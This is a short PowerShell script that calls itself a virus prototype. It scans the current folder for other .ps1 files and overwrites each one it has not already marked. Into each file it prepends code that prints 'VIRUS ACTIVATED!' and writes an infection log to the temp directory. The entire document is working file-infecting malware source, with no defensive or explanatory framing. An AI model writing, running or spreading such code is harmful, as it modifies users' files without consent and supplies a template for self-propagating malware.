# Simple virus prototype - adds signature lines to other .ps1 files
Write-Host "VIRUS ACTIVATED!" -ForegroundColor Red

# Find and infect other PowerShell files
Get-ChildItem -Filter "*.ps1" | Where-Object { $_.Name -ne "virus-prototype.ps1" } | ForEach-Object {
    $content = Get-Content $_.FullName -Raw
    if ($content -notmatch "Virus_INFECTED") {
        Write-Host "Infecting: $($_.Name)" -ForegroundColor Yellow
        
        # Add virus signatures to infected file (WITH VIRUS MESSAGE)
        $virusSignatures = @"
# Virus_INFECTED
Write-Host "VIRUS ACTIVATED!" -ForegroundColor Red
try {
    `$InfectionMarker = "INFECTED"
    Set-Content -Path "`$env:TEMP\virus_log.txt" -Value "File infected: $($_.Name)" -ErrorAction SilentlyContinue
} catch {
    # Ignore errors in infection marker
}

"@
        
        $newContent = "$virusSignatures`n# Original file content:`n$content"
        Set-Content -Path $_.FullName -Value $newContent
    }
}